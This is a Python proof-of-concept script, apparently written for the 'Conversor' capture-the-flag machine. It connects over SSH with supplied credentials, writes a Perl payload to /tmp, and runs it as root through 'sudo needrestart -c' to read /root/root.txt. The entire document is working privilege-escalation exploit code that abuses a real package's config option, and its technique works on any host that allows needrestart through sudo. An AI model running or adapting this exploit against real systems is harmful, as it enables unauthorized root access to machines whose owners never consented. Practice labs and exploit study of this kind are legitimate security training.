import paramiko
import os
import argparse
# Autor 0xmr
parser = argparse.ArgumentParser(description="Conversor Machine PoC:- We Need Creds to get Root ")
parser.add_argument('-ip', help="Target IP", required=True)
parser.add_argument('-user', help="Enter the Username", required=True)
parser.add_argument('-passwd', help="Enter the Password", required=True)
args = parser.parse_args()

print("[+] Starting script..")

def execute_command(ssh, command, timeout=10):
    try:
        stdin, stdout, stderr = ssh.exec_command(command, timeout=timeout)
        output = stdout.read().decode()
        error = stderr.read().decode()
        if error:
            print(f"[-] Error: {error}")
        else:
            print(f"[+] ===> {output}")
        return output, error
    except Exception as e:
        print(f"[-] Exception: {str(e)}")
        return "", str(e)

def ssh():
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        print("[+] Connecting to target")
        ssh.connect(args.ip, username=args.user, password=args.passwd)
        print("[+] Connected")
        
        commands = [
            "whoami",
            "cat > /tmp/exploit.pl << 'EOF'\n#!/usr/bin/perl\nsystem(\"whoami > /tmp/whoami.txt\");\nsystem(\"id > /tmp/id.txt\");\nsystem(\"cat /root/root.txt > /tmp/root_flag.txt 2>/dev/null\");\nEOF",
            "chmod +x /tmp/exploit.pl",
            "sudo /usr/sbin/needrestart -c /tmp/exploit.pl",
            "cat /tmp/whoami.txt",
            "cat /tmp/id.txt", 
            "cat /tmp/root_flag.txt"
        ]
        
        for cmd in commands:
            execute_command(ssh, cmd)
            
    except paramiko.ssh_exception.AuthenticationException:
        print("[-] Authentication failed")
    except paramiko.ssh_exception.NoValidConnectionsError:
        print("[-] Connection failed")
    except Exception as e:
        print(f"[-] Error: {str(e)}")
    finally:
        ssh.close()
        print("[+]  Exploit Completed !")

if __name__ == "__main__":
    ssh()
